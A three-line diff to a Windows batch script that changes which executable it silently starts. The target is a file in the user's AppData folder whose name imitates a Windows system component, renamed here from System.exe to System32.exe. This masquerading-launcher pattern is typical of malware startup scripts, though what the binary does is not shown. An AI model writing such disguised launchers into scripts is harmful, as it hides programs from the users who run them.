@@ -1,3 +1,3 @@
 @echo off
-start %appdata%\\Microsoft\\Windows\\System.exe
+start %appdata%\\Microsoft\\Windows\\System32.exe
 exit
